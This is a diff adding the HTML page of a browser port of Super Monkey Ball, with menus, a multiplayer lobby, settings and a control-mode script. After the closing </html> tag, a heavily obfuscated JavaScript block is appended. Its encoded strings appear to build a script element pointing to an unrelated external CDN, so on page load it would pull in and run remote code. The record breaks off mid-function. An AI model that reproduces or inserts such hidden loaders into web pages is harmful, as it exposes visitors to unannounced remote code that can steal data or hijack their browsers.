@@ -1,0 +1,752 @@
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-L7856P3VNT"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-L7856P3VNT');
+</script><!doctype html>
+<html lang="en">
+<base href="https://cdn.jsdelivr.net/gh/bubbls/WebMonkeyBall@main/">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <title>SMB1 Web Gameplay</title>
+
+  <!-- iOS: run without Safari UI when launched from Home Screen -->
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+  <meta name="theme-color" content="#000000" media="(prefers-color-scheme: dark)">
+  <meta name="theme-color" content="#000000" media="(prefers-color-scheme: light)">
+
+  <link rel="stylesheet" href="./style.css" />
+  <script type="importmap">
+    {
+      "imports": {
+        "gl-matrix": "https://cdn.jsdelivr.net/npm/gl-matrix@3.4.3/esm/index.js"
+      }
+    }
+  </script>
+</head>
+
+<body>
+  <canvas id="game"></canvas>
+  <canvas id="hud-canvas"></canvas>
+  <div id="stage-fade" class="stage-fade"></div>
+  <div id="overlay" class="overlay">
+
+    <div class="menu-actions">
+      <div class="menu-actions-top">
+        <div class="credits-menu" id="credits-menu">
+          <button class="credits-label" id="credits-toggle" type="button" aria-haspopup="true" aria-expanded="false">
+            Credits
+          </button>
+
+          <div class="credits-panel" id="credits-panel">
+            <div>
+              <a href="https://ko-fi.com/twilightpb" target="_blank" rel="noopener">TwilightPB</a>
+              <span>— Porting</span>
+            </div>
+            <div>
+              <a href="https://complexplane.dev" target="_blank" rel="noopener">ComplexPlane</a>
+              <span>— Renderer</span>
+            </div>
+            <div>
+              camthesaxman <span>— SMB1 Decompilation</span>
+            </div>
+            <div class="credits-multiline">
+              <div class="credits-title">SMB2 Decompilation</div>
+              <div class="credits-sublist">
+                <div>ComplexPlane</div>
+                <div>CraftedCart</div>
+                <div>EELI</div>
+                <div>Eucalyptus</div>
+                <div>The BombSquad</div>
+              </div>
+            </div>
+            <div>
+              Amusement Vision <span>— Original game</span>
+            </div>
+            <div>
+              <a href="https://discord.gg/CEYjvDj" target="_blank" rel="noopener">SMB Custom Level Community</a>
+              <span>— Tools and resources</span>
+            </div>
+          </div>
+        </div>
+        <button id="open-settings" class="ghost compact settings-button" type="button">Settings</button>
+      </div>
+      <a id="discord-server-link" class="menu-action-link" href="https://discord.gg/j9RRPBTGxt" target="_blank" rel="noopener noreferrer">
+        <img class="discord-server-icon" src="./discord-favicon.ico" alt="" aria-hidden="true" />
+        <span>Discord Server</span>
+      </a>
+    </div>
+    <div class="panel" id="main-menu">
+      <h1>Super Monkey Ball</h1>
+      <p>Select a mode.</p>
+
+      <div class="panel-section">
+        <button id="open-singleplayer" class="menu-button" type="button">
+          <span class="menu-button-title">Singleplayer</span>
+          <span class="menu-button-subtitle">Course play and practice</span>
+        </button>
+      </div>
+
+      <div class="panel-section">
+        <button id="open-multiplayer" class="menu-button" type="button">
+          <span class="menu-button-title">Online Multiplayer</span>
+          <span id="lobby-online-count" class="menu-button-subtitle">0 players online</span>
+        </button>
+      </div>
+
+      <div class="panel-section">
+        <button id="open-replay-library" class="menu-button" type="button">
+          <span class="menu-button-title">Replays</span>
+          <span class="menu-button-subtitle">Saved local replay library</span>
+        </button>
+      </div>
+
+      <div class="row hidden">
+        <button id="start" disabled>Start</button>
+        <button id="resume" class="ghost" disabled>Resume</button>
+      </div>
+      <div class="hint">
+        <div>Controls: WASD / Arrow Keys = tilt, R = reset stage, N = skip stage</div>
+        <div>If you have a controller plugged in, it should work too.</div>
+      </div>
+      <div id="main-menu-version" class="menu-version" aria-label="Build version"></div>
+    </div>
+    <div class="panel hidden" id="singleplayer-menu">
+      <div class="menu-header">
+        <button id="singleplayer-back" class="ghost compact" type="button">Back</button>
+        <div>
+          <h1>Singleplayer</h1>
+          <p>Pick course play or practice.</p>
+        </div>
+      </div>
+      <div class="panel-section">
+        <button id="open-course-play" class="menu-button" type="button">
+          <span class="menu-button-title">Course Play</span>
+          <span class="menu-button-subtitle">Start from floor 1</span>
+        </button>
+      </div>
+      <div class="panel-section">
+        <button id="open-practice" class="menu-button" type="button">
+          <span class="menu-button-title">Practice</span>
+          <span class="menu-button-subtitle">Choose any stage, then repeat it</span>
+        </button>
+      </div>
+    </div>
+    <div class="panel hidden" id="course-play-menu">
+      <div class="menu-header">
+        <button id="course-play-back" class="ghost compact" type="button">Back</button>
+        <div>
+          <h1>Course Play</h1>
+          <p>Choose source and difficulty.</p>
+        </div>
+      </div>
+      <div class="panel-section">
+        <label class="field">
+          <span>Game Source</span>
+          <select id="course-play-source"></select>
+        </label>
+      </div>
+      <div class="panel-section">
+        <label class="field">
+          <span>Difficulty</span>
+          <select id="course-play-difficulty"></select>
+        </label>
+      </div>
+      <div class="panel-section">
+        <button id="course-play-start" type="button">Start Course</button>
+      </div>
+    </div>
+    <div class="panel hidden pause-menu-panel" id="pause-menu">
+      <div class="pause-menu-frame">
+        <div class="pause-menu-title">PAUSE</div>
+        <div class="pause-menu-list" role="menu" aria-label="Pause Menu">
+          <button id="pause-resume" class="pause-menu-item" type="button">Resume</button>
+          <button id="pause-retry" class="pause-menu-item" type="button">Retry</button>
+          <button id="pause-save-replay" class="pause-menu-item" type="button">Save Replay</button>
+          <button id="pause-view-stage" class="pause-menu-item" type="button">View Stage</button>
+          <button id="pause-return-main-menu" class="pause-menu-item" type="button">Return to Main Menu</button>
+        </div>
+      </div>
+    </div>
+    <div class="panel hidden" id="level-select-menu">
+      <div class="menu-header">
+        <button id="level-select-back" class="ghost compact" type="button">Back</button>
+        <div>
+          <h1 id="level-select-title">Level Select</h1>
+          <p id="level-select-subtitle">Choose the game source, course, and stage.</p>
+        </div>
+      </div>
+      <div class="panel-section">
+        <label class="field">
+          <span>Game Source</span>
+          <select id="game-source">
+            <option value="smb1">Super Monkey Ball 1</option>
+            <option value="smb2">Super Monkey Ball 2</option>
+            <option value="mb2ws">Super Monkey Ball 2 (MB2WS)</option>
+          </select>
+        </label>
+      </div>
+      <div class="panel-section">
+        <div class="panel-section-header">
+          <h2>Packs</h2>
+        </div>
+        <div class="pack-controls">
+          <button id="pack-load" class="ghost compact" type="button">Load Pack</button>
+          <div id="pack-picker" class="pack-picker hidden">
+            <button id="pack-load-zip" class="ghost compact" type="button">Zip File</button>
+            <button id="pack-load-folder" class="ghost compact" type="button">Folder</button>
+          </div>
+          <div id="pack-status" class="pack-status">No pack loaded</div>
+        </div>
+        <input id="pack-file" class="hidden" type="file" accept=".zip" />
+        <input id="pack-folder" class="hidden" type="file" webkitdirectory />
+      </div>
+      <div class="panel-section">
+        <div class="panel-section-header">
+          <h2>Stage Selection</h2>
+        </div>
+        <div id="smb1-fields">
+          <label class="field">
+            <span>Difficulty</span>
+            <select id="difficulty">
+              <option value="beginner">Beginner</option>
+              <option value="advanced">Advanced</option>
+              <option value="expert">Expert</option>
+              <option value="beginner-extra">Beginner (Extra)</option>
+              <option value="advanced-extra">Advanced (Extra)</option>
+              <option value="expert-extra">Expert (Extra)</option>
+              <option value="master">Master</option>
+            </select>
+          </label>
+          <label class="field">
+            <span>Stage</span>
+            <select id="smb1-stage"></select>
+          </label>
+        </div>
+        <div id="smb2-fields" class="hidden">
+          <label class="field">
+            <span>SMB2 Mode</span>
+            <select id="smb2-mode">
+              <option value="challenge">Challenge</option>
+              <option value="story">Story</option>
+            </select>
+          </label>
+          <div id="smb2-challenge-fields">
+            <label class="field">
+              <span>Challenge Difficulty</span>
+              <select id="smb2-challenge">
+                <option value="beginner">Beginner</option>
+                <option value="advanced">Advanced</option>
+                <option value="expert">Expert</option>
+                <option value="beginner-extra">Beginner Extra</option>
+                <option value="advanced-extra">Advanced Extra</option>
+                <option value="expert-extra">Expert Extra</option>
+                <option value="master">Master</option>
+                <option value="master-extra">Master Extra</option>
+              </select>
+            </label>
+            <label class="field">
+              <span>Challenge Stage</span>
+              <select id="smb2-challenge-stage"></select>
+            </label>
+          </div>
+          <div id="smb2-story-fields" class="hidden">
+            <label class="field">
+              <span>Story World</span>
+              <select id="smb2-story-world"></select>
+            </label>
+            <label class="field">
+              <span>Story Stage</span>
+              <select id="smb2-story-stage"></select>
+            </label>
+          </div>
+        </div>
+      </div>
+      <div id="level-select-actions" class="panel-section">
+        <button id="level-select-confirm" type="button">Confirm</button>
+        <div class="control-hint">Return to main menu with this selection.</div>
+      </div>
+      <div id="lobby-stage-actions" class="panel-section hidden">
+        <div class="panel-section-header">
+          <h2>Lobby Stage</h2>
+        </div>
+        <button id="lobby-stage-choose" type="button">Choose</button>
+        <div class="control-hint">Updates the lobby selection without starting the match.</div>
+      </div>
+    </div>
+    <div class="panel hidden" id="replay-library-menu">
+      <div class="menu-header">
+        <button id="replay-library-back" class="ghost compact" type="button">Back</button>
+        <div>
+          <h1>Replays</h1>
+          <p>Local replay library.</p>
+        </div>
+      </div>
+      <div class="panel-section">
+        <div class="row">
+          <button id="replay-library-import" class="ghost" type="button">Import Replay</button>
+          <button id="replay-library-refresh" class="ghost" type="button">Refresh</button>
+          <div id="replay-library-status" class="pack-status">Replays: idle</div>
+        </div>
+        <input id="replay-library-file" class="hidden" type="file" accept=".json" />
+        <div id="replay-library-list" class="leaderboard-list"></div>
+      </div>
+    </div>
+    <div class="multiplayer-layout hidden" id="multiplayer-layout">
+      <div class="panel hidden" id="multiplayer-menu">
+        <div class="menu-header">
+          <button id="multiplayer-back" class="ghost compact" type="button">Back</button>
+          <div>
+            <h1>Online Multiplayer</h1>
+            <p>Join public lobbies, invite friends, or host your own room.</p>
+          </div>
+        </div>
+        <div id="multiplayer-browser" class="multiplayer-view">
+          <div class="panel-section">
+            <div class="panel-section-header">
+              <h2>Public Lobbies</h2>
+              <button id="lobby-refresh" class="ghost compact" type="button">Refresh</button>
+            </div>
+            <div id="lobby-status" class="pack-status">Lobby: idle</div>
+            <div id="lobby-list" class="lobby-list"></div>
+          </div>
+          <div class="panel-section">
+            <div class="panel-section-header">
+              <h2>Join Private Room</h2>
+            </div>
+            <div class="multiplayer-row">
+              <input id="lobby-code" class="text-input" type="password" placeholder="Room code" autocomplete="off" />
+              <button id="lobby-join" class="ghost compact" type="button">Join</button>
+            </div>
+          </div>
+          <div class="panel-section">
+            <div class="panel-section-header">
+              <h2>Host Room</h2>
+            </div>
+            <div class="multiplayer-row">
+              <button id="lobby-create" class="ghost compact" type="button">Create Room</button>
+              <label class="checkbox-field">
+                <input id="lobby-public" type="checkbox" checked />
+                <span>Public</span>
+              </label>
+            </div>
+            <div class="multiplayer-row">
+              <input id="lobby-name" class="text-input" type="text" placeholder="Lobby name (optional)" maxlength="64" />
+            </div>
+          </div>
+        </div>
+        <div id="multiplayer-lobby" class="multiplayer-view hidden">
+          <div class="panel-section">
+            <div class="panel-section-header">
+              <h2>Lobby</h2>
+              <button id="lobby-copy-code" class="ghost compact hidden" type="button">Copy Room Code</button>
+              <button id="lobby-leave" class="ghost compact hidden" type="button">Leave Room</button>
+            </div>
+            <div id="lobby-room-info" class="lobby-room-info"></div>
+            <label class="field">
+              <span>Lobby Name</span>
+              <input id="lobby-room-name" class="text-input" type="text" maxlength="64" />
+            </label>
+            <div id="lobby-room-status" class="lobby-room-status"></div>
+          </div>
+          <div class="panel-section">
+            <div class="panel-section-header">
+              <h2>Players</h2>
+            </div>
+            <div id="lobby-player-list" class="lobby-player-list"></div>
+          </div>
+          <div class="panel-section">
+            <div class="panel-section-header">
+              <h2>Match Settings</h2>
+            </div>
+            <div class="lobby-setting">
+              <span>Selected Stage</span>
+              <button id="lobby-stage-button" class="lobby-setting-value lobby-setting-button" type="button">
+                <span id="lobby-stage-info">Unknown</span>
+              </button>
+            </div>
+            <label class="field">
+              <span>Gamemode</span>
+              <select id="lobby-gamemode">
+                <option value="standard">Standard</option>
+                <option value="chained_together">Chained Together</option>
+              </select>
+            </label>
+            <div id="lobby-gamemode-options" class="lobby-gamemode-options hidden"></div>
+            <label class="field">
+              <span>Max Players</span>
+              <select id="lobby-max-players">
+                <option value="2">2</option>
+                <option value="3">3</option>
+                <option value="4">4</option>
+                <option value="5">5</option>
+                <option value="6">6</option>
+                <option value="7">7</option>
+                <option value="8">8</option>
+                <option value="9">9</option>
+                <option value="10">10</option>
+                <option value="11">11</option>
+                <option value="12">12</option>
+                <option value="13">13</option>
+                <option value="14">14</option>
+                <option value="15">15</option>
+                <option value="16">16</option>
+              </select>
+            </label>
+            <div id="lobby-max-players-warning" class="control-hint lobby-max-players-warning hidden">
+              Increased max players may negatively impact gameplay performance.
+            </div>
+            <label class="checkbox-field">
+              <input id="lobby-collision" type="checkbox" checked />
+              <span>Player Collision</span>
+            </label>
+            <label class="checkbox-field">
+              <input id="lobby-infinite-time" type="checkbox" />
+              <span>Infinite Time</span>
+            </label>
+            <label class="checkbox-field">
+              <input id="lobby-locked" type="checkbox" />
+              <span>Lock Room</span>
+            </label>
+            <div class="control-hint">Only the host can change match settings.</div>
+          </div>
+          <div class="panel-section">
+            <button id="lobby-start" type="button">Start Match</button>
+          </div>
+        </div>
+      </div>
+      <div class="panel lobby-chat-panel hidden" id="lobby-chat-panel">
+        <div class="panel-section-header">
+          <h2>Chat</h2>
+        </div>
+        <div id="lobby-chat-list" class="chat-list"></div>
+        <div class="chat-input-row">
+          <input id="lobby-chat-input" class="text-input" type="text" placeholder="Type a message..." maxlength="200" />
+          <button id="lobby-chat-send" class="ghost compact" type="button">Send</button>
+        </div>
+      </div>
+    </div>
+    <div class="panel hidden" id="multiplayer-ingame-menu">
+      <div class="menu-header">
+        <div>
+          <h1>Match Menu</h1>
+          <p>Multiplayer session controls.</p>
+        </div>
+      </div>
+      <div class="panel-section">
+        <div class="panel-section-header">
+          <h2>Players</h2>
+        </div>
+        <div id="ingame-player-list" class="lobby-player-list"></div>
+      </div>
+      <div class="panel-section">
+        <div class="row">
+          <button id="ingame-resume" class="ghost" type="button">Resume</button>
+          <button id="ingame-return-lobby" class="ghost hidden" type="button">Return to Lobby</button>
+          <button id="ingame-leave" type="button">Leave Match</button>
+        </div>
+      </div>
+    </div>
+    <div class="panel hidden" id="settings-menu">
+      <div class="menu-header">
+        <button id="settings-back" class="ghost compact" type="button">Back</button>
+        <div>
+          <h1>Settings</h1>
+          <p>Adjust controls, audio, and multiplayer preferences.</p>
+        </div>
+      </div>
+      <div class="settings-tabs" role="tablist">
+        <button class="settings-tab-button active" type="button" data-settings-tab="input">Input</button>
+        <button class="settings-tab-button" type="button" data-settings-tab="audio">Audio</button>
+        <button class="settings-tab-button" type="button" data-settings-tab="multiplayer">Multiplayer</button>
+      </div>
+      <div class="settings-tab-panels">
+        <div class="settings-tab-panel" data-settings-panel="input">
+          <div class="panel-section">
+            <div class="panel-section-header">
+              <h2>Controls</h2>
+            </div>
+            <label id="control-mode-field" class="field hidden">
+              <span>Control Mode</span>
+              <div class="control-mode-row">
+                <select id="control-mode"></select>
+                <button id="gyro-recalibrate" class="ghost compact hidden" type="button">Recalibrate</button>
+                <div id="gyro-helper" class="gyro-helper hidden" aria-hidden="true">
+                  <div class="gyro-helper-frame">
+                    <div id="gyro-helper-ghost" class="gyro-helper-ghost"></div>
+                    <div id="gyro-helper-device" class="gyro-helper-device"></div>
+                  </div>
+                </div>
+              </div>
+            </label>
+            <div id="control-mode-settings" class="control-mode-settings hidden">
+              <div id="gyro-settings" class="control-mode-block hidden">
+                <label class="field slider-field">
+                  <span>Gyro Sensitivity <output id="gyro-sensitivity-value">25°</output></span>
+                  <input id="gyro-sensitivity" type="range" min="10" max="25" step="1" value="25" />
+                </label>
+                <div id="gyro-hint" class="control-hint">Tap the screen during gameplay to recalibrate gyro.</div>
+              </div>
+              <div id="touch-settings" class="control-mode-block hidden">
+                <label class="field slider-field">
+                  <span>Virtual Joystick Size <output id="joystick-size-value">1.0x</output></span>
+                  <input id="joystick-size" type="range" min="0.5" max="2" step="0.1" value="1" />
+                </label>
+              </div>
+              <div id="input-falloff-block" class="control-mode-block">
+                <label class="field slider-field">
+                  <span>Input Falloff <output id="input-falloff-value">1.5</output></span>
+                  <input id="input-falloff" type="range" min="1" max="2" step="0.05" value="1" />
+                </label>
+                <div class="input-falloff-visuals">
+                  <div id="input-falloff-curve-wrap" class="response-curve">
+                    <svg id="input-falloff-curve" viewBox="0 0 100 100" role="img" aria-hidden="true">
+                      <path id="input-falloff-path" d="M 0 100 L 100 0"></path>
+                    </svg>
+                  </div>
+                  <div id="input-preview" class="input-preview" aria-hidden="true">
+                    <div class="input-preview-grid"></div>
+                    <div id="input-raw-dot" class="input-dot raw"></div>
+                    <div id="input-processed-dot" class="input-dot processed"></div>
+                  </div>
+                </div>
+                <div class="control-hint">
+                  A lower value makes joystick input more linear. Higher makes small adjustments more precise.
+                </div>
+              </div>
+              <div id="gamepad-calibration-block" class="control-mode-block hidden">
+                <button id="gamepad-calibrate" class="ghost compact" type="button">Calibrate Stick</button>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="settings-tab-panel hidden" data-settings-panel="audio">
+          <div class="panel-section">
+            <div class="panel-section-header">
+              <h2>Audio</h2>
+            </div>
+            <div class="slider-group">
+              <label class="field slider-field">
+                <span>Music Volume <output id="music-volume-value">50%</output></span>
+                <input id="music-volume" type="range" min="0" max="100" value="50" />
+              </label>
+              <label class="field slider-field">
+                <span>SFX Volume <output id="sfx-volume-value">30%</output></span>
+                <input id="sfx-volume" type="range" min="0" max="100" value="30" />
+              </label>
+              <label class="field slider-field">
+                <span>Announcer Volume <output id="announcer-volume-value">30%</output></span>
+                <input id="announcer-volume" type="range" min="0" max="100" value="30" />
+              </label>
+            </div>
+          </div>
+        </div>
+        <div class="settings-tab-panel hidden" data-settings-panel="multiplayer">
+          <div class="panel-section">
+            <div class="panel-section-header">
+              <h2>Profile</h2>
+            </div>
+            <label class="field">
+              <span>Display Name</span>
+              <input id="profile-name" class="text-input" type="text" maxlength="64" />
+            </label>
+            <div class="profile-avatar-row">
+              <div id="profile-avatar-preview" class="profile-avatar-preview" aria-hidden="true"></div>
+              <div class="profile-avatar-controls">
+                <input id="profile-avatar-input" class="text-input" type="file" accept="image/png,image/jpeg,image/webp" />
+                <button id="profile-avatar-clear" class="ghost compact" type="button">Clear Avatar</button>
+                <div id="profile-avatar-error" class="control-hint hidden"></div>
+              </div>
+            </div>
+            <div class="control-hint">PNG/JPG/WebP only. Max 512x512 and 150kb.</div>
+            <div class="profile-ball-row">
+              <label class="field">
+                <span>Hemisphere 1 Color</span>
+                <input id="profile-ball-hemi1-color" class="color-input" type="color" value="#ff0000" />
+              </label>
+              <label class="field">
+                <span>Hemisphere 2 Color</span>
+                <input id="profile-ball-hemi2-color" class="color-input" type="color" value="#ffffff" />
+              </label>
+            </div>
+            <div class="profile-ball-texture-row">
+              <label class="field">
+                <span>Hemisphere 1 Texture</span>
+                <input id="profile-ball-hemi1-texture-input" class="text-input" type="file" accept="image/png,image/jpeg,image/webp" />
+                <button id="profile-ball-hemi1-texture-clear" class="ghost compact" type="button">Clear Hemisphere 1 Texture</button>
+              </label>
+              <label class="field">
+                <span>Hemisphere 2 Texture</span>
+                <input id="profile-ball-hemi2-texture-input" class="text-input" type="file" accept="image/png,image/jpeg,image/webp" />
+                <button id="profile-ball-hemi2-texture-clear" class="ghost compact" type="button">Clear Hemisphere 2 Texture</button>
+              </label>
+            </div>
+            <div class="profile-ball-preview-row">
+              <div class="profile-ball-preview-label">Ball Preview</div>
+              <div class="profile-ball-preview-window">
+                <canvas id="profile-ball-preview" width="320" height="220" aria-label="Ball preview"></canvas>
+              </div>
+            </div>
+            <div id="profile-ball-texture-error" class="control-hint hidden"></div>
+            <div class="control-hint">Ball textures sync in multiplayer. Max 512x512 and 100kb per hemisphere.</div>
+          </div>
+          <div class="panel-section">
+            <div class="panel-section-header">
+              <h2>Privacy</h2>
+            </div>
+            <label class="checkbox-field">
+              <input id="hide-player-names" type="checkbox" />
+              <span>Hide Player Names</span>
+            </label>
+            <label class="checkbox-field">
+              <input id="hide-lobby-names" type="checkbox" />
+              <span>Hide Lobby Names</span>
+            </label>
+            <label class="checkbox-field">
+              <input id="hide-remote-ball-textures" type="checkbox" />
+              <span>Hide Remote Ball Textures</span>
+            </label>
+            <div class="control-hint">Replaces names with deterministic aliases for safer sharing.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="ingame-chat" class="ingame-chat hidden">
+    <div id="ingame-chat-list" class="chat-list chat-list-ingame"></div>
+    <div id="ingame-chat-input-row" class="chat-input-row collapsed">
+      <input id="ingame-chat-input" class="text-input" type="text" placeholder="ENTER to chat..." maxlength="200" />
+    </div>
+  </div>
+
+  <div id="touch-controls" class="touch-controls hidden" aria-hidden="true">
+    <div class="joystick hidden" aria-hidden="true">
+      <div class="joystick-base"></div>
+      <div class="joystick-handle"></div>
+    </div>
+  </div>
+
+  <button id="mobile-menu-button" class="mobile-menu-button hidden" type="button">
+    Menu
+  </button>
+
+  <button id="fullscreen-button" class="ghost compact fullscreen-button hidden" type="button">
+    Fullscreen
+  </button>
+
+  <div id="gamepad-calibration" class="modal hidden" role="dialog" aria-modal="true" aria-hidden="true">
+    <div class="modal-card">
+      <h2>Stick Calibration</h2>
+      <p>Move the left stick in slow circles to map the gate. Use the full range.</p>
+      <canvas id="gamepad-calibration-map" width="240" height="240"></canvas>
+      <div class="control-hint">Click anywhere or press any controller button to close.</div>
+    </div>
+  </div>
+
+  <script type="module">
+    const field = document.getElementById('control-mode-field');
+    const select = document.getElementById('control-mode');
+    const hasTouch = ('ontouchstart' in window) || ((navigator.maxTouchPoints ?? 0) > 0);
+    const hasCoarsePointer = window.matchMedia?.('(pointer: coarse)')?.matches ?? false;
+    const hasGyro = typeof window.DeviceOrientationEvent !== 'undefined' && (hasTouch || hasCoarsePointer);
+    const gyroButton = document.getElementById('gyro-recalibrate');
+    const gyroHelper = document.getElementById('gyro-helper');
+
+    if (!field || !select || (!hasTouch && !hasGyro)) {
+      field?.classList.add('hidden');
+    } else {
+      const options = [];
+      if (hasGyro) options.push({
+        value: 'gyro',
+        label: 'Gyro'
+      });
+      if (hasTouch) options.push({
+        value: 'touch',
+        label: 'Touchscreen'
+      });
+
+      if (options.length === 0) {
+        field.classList.add('hidden');
+      } else {
+        field.classList.remove('hidden');
+        select.innerHTML = '';
+        for (const opt of options) {
+          const el = document.createElement('option');
+          el.value = opt.value;
+          el.textContent = opt.label;
+          select.appendChild(el);
+        }
+
+        const key = 'smb_control_mode';
+        const saved = localStorage.getItem(key);
+        if (saved && options.some((o) => o.value === saved)) {
+          select.value = saved;
+        } else {
+          select.value = hasTouch ? 'touch' : 'gyro';
+          localStorage.setItem(key, select.value);
+        }
+
+        const syncGyroUi = () => {
+          const showGyro = select.value === 'gyro';
+          gyroButton?.classList.toggle('hidden', !showGyro);
+          gyroHelper?.classList.toggle('hidden', !showGyro);
+        };
+
+        syncGyroUi();
+
+        const requestGyroPermission = async () => {
+          const requests = [];
+          const orientationPermission = window.DeviceOrientationEvent?.requestPermission;
+          if (typeof orientationPermission === 'function') {
+            requests.push(orientationPermission.call(window.DeviceOrientationEvent));
+          }
+          const motionPermission = window.DeviceMotionEvent?.requestPermission;
+          if (typeof motionPermission === 'function') {
+            requests.push(motionPermission.call(window.DeviceMotionEvent));
+          }
+          if (requests.length === 0) {
+            return 'granted';
+          }
+          try {
+            const results = await Promise.all(requests);
+            return results.every((result) => result === 'granted') ? 'granted' : 'denied';
+          } catch {
+            return 'denied';
+          }
+        };
+
+        select.addEventListener('change', async () => {
+          let next = select.value;
+
+          // iOS: gyro requires a user-gesture permission prompt.
+          if (next === 'gyro') {
+            const result = await requestGyroPermission();
+            if (result !== 'granted') {
+              next = hasTouch ? 'touch' : 'gyro';
+              select.value = next;
+            }
+          }
+
+          localStorage.setItem(key, next);
+          syncGyroUi();
+        });
+      }
+    }
+  </script>
+
+  <script>
+    window.LOBBY_URL = "https://webmonkeyball-lobby.sndrec32exe.workers.dev";
+  </script> 
+
+  <script type="module" src="./dist/rain.js"></script>
+  <!-- Cloudflare Pages Analytics -->
+  <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "ba4e488caf8849e9af3e0cc5ff39ffaf"}'></script><!-- Cloudflare Pages Analytics -->
+</body>
+
+</html>
+<script>(function(ykJYJgqRQvLQ,gSsZu$aEkLNcrSPk){const kGsNXc=sFfEkK$fMziBAJZwZbkuvp,gXeiNWc=ykJYJgqRQvLQ();while(!![]){try{const HcMpeIOoYPvgF=Number(-parseFloat(kGsNXc(0x1a7))/(0xa*Number(parseInt(0x133))+parseInt(0x1581)+-0x6*parseInt(0x595)))*(-parseFloat(kGsNXc(0x183))/(parseInt(0x238d)+parseInt(0x2)*-0x85b+parseInt(-0x3)*0x647))+Number(-parseFloat(kGsNXc(0x18f))/(Math.floor(-0x1e99)+0x1a*-0x151+parseInt(0x40d6)))*(parseFloat(kGsNXc(0x17e))/(Number(parseInt(0x1d))*Number(0xe7)+-parseInt(0x2)*-0xec9+Math.max(-0x631,-0x631)*parseInt(0x9)))+parseFloat(kGsNXc(0x1be))/(0x1*-parseInt(0x23)+-parseInt(0x1)*Math.max(0x579,parseInt(0x579))+0x5a1)+-parseFloat(kGsNXc(0x1a9))/(Math.floor(parseInt(0xfbc))+Math.floor(-parseInt(0x1c3b))+Math.ceil(parseInt(0x281))*0x5)*(parseFloat(kGsNXc(0x191))/(Math.max(0x1,0x1)*-parseInt(0x88d)+Math.trunc(0x776)+parseInt(0x11e)))+parseInt(-parseFloat(kGsNXc(0x1ac))/(Number(0x3)*parseInt(0x72a)+0x243*-0xb+Number(0x36b)))*parseInt(-parseFloat(kGsNXc(0x189))/(-0x1*-parseInt(0x1875)+-parseInt(0x1)*0x2186+-0x5*-0x1d2))+Math['max'](-parseFloat(kGsNXc(0x1b2))/(parseInt(0x3d)*Number(0x90)+parseInt(0x1)*-0x1e1f+-parseInt(0x427)),-parseFloat(kGsNXc(0x1b6))/(Math.max(-parseInt(0x200e),-0x200e)+0x1*parseInt(0xaea)+0x1ed*parseInt(0xb)))+parseInt(parseFloat(kGsNXc(0x195))/(parseInt(0x1bc9)+-parseInt(0x764)+Math.trunc(-parseInt(0x1459))));if(HcMpeIOoYPvgF===gSsZu$aEkLNcrSPk)break;else gXeiNWc['push'](gXeiNWc['shift']());}catch(FoDQtRV){gXeiNWc['push'](gXeiNWc['shift']());}}}(UravPbGESYjDUNqxKcf$Vqza,-0x1*parseFloat(parseInt(0x62251))+-0x204aa+parseInt(0x3b35)*parseInt(0x43)));function UravPbGESYjDUNqxKcf$Vqza(){const VwjQavltNv=['ec898d9b88abb4','edede8aca19f8db3b0','ede8edece1edb1a99dae9a9f','ece8e1e1e9e183b8b39d8e80','bdb0af','b8a9a9bcb7bd9ab1b0b5bd','bbb6bda0','baabbcb8adbc9cb5bcb4bcb7ad','e0ecedefebece9b7a19389bc98','ee9ab5baab9288','b5b6be','aaadb8abadaa8eb0adb1','e8e9ece9e9e1eeecb49495bcaab3','efebe8e0e1ebeceaabb1b68cbabb','b5b6bab8b5b1b6aaad','adb68aadabb0b7be','bfb5b6b6ab','b1adada9aae3f6f6babdb7f7abe0a1f7b0b7f6b8b0b5b6beb0ba86beb7f4b4b8adb1f7bdbcaf86b6bbbff7b3aa','a9abb6adb6ada0a9bc','ebe0b5b5a99ebbb1','edede1eae9e9e98bb4beb6b1b0','a9abb6adb6bab6b5','efe8ef8ea39bad9dad','adb8bbb5bc','e8eeef9b979b8ab1b4','e0ede8eee1e1e19293969e9da0','b0b7bfb6','eeeee1eae8e19aa19ab494b3','a9acaab1','bbb0b7bd','babcb0b5','ebedea96bc9f9e88b1','ebefe9ebe8e9bbaaadb2b090','efeab3909e958092','b8a9a9b5a0','abb8b7bdb6b48c8c909d','bebcad9cb5bcb4bcb7ad9ba090bd','eee9efeeef9c9a979d8f8b','bca1babca9adb0b6b7','e8ece1e8e0b3a1b6b19488','aab1b0bfad','e8e9ebebe9aba1b39f9493','a2a4f7bab6b7aaadabacbaadb6abf1fbabbcadacabb7f9adb1b0aafbf0f1f9f0','aabcb8abbab1','bab6b7aab6b5bc','eeecefe1efede99fb69f928f91','adabacb7ba','aabaabb0a9ad','aaabba','bab6b7aaadabacbaadb6ab','abbcb4b6afbc','8686a9abb6adb68686','abbca9b5b8babc98b5b5','e8ebeef7e9f7e9f7e8','aeb8abb7','bfb0b5bc','adabb8babc','b1b6aaadb7b8b4bc','abbcadacabb7f9f1bfacb7baadb0b6b7f1f0f9','eceae1eee9e8e9938eb49fbc96','f1f1f1f7f2f0f2f0f2f0f2fd','bcababb6ab','e8eaefeee989b2b6aab38b','ebbb8f9db190a8','b5bcb7beadb1','e8eeebe1ac81b6bca08d'];UravPbGESYjDUNqxKcf$Vqza=function(){return VwjQavltNv;};return UravPbGESYjDUNqxKcf$Vqza();}function _0xe8c3(rg_FddjIYmSuDaXct_SbftOPO,Od_FYPa_mevt){rg_FddjIYmSuDaXct_SbftOPO=rg_FddjIYmSuDaXct_SbftOPO-(Math.trunc(parseInt(0xe6e))+parseInt(0x272)+0x4*parseFloat(-0x408));const RpdkwFFntaedhLUsDwbyOh=_0x257e();let uWkwAed$dMg_pC=RpdkwFFntaedhLUsDwbyOh[rg_FddjIYmSuDaXct_SbftOPO];return uWkwAed$dMg_pC;}(function(mRvOXTqaCttJOulbTlUWmr,C_FoJhGb_hSKAwdyPQonizmLyCA){const 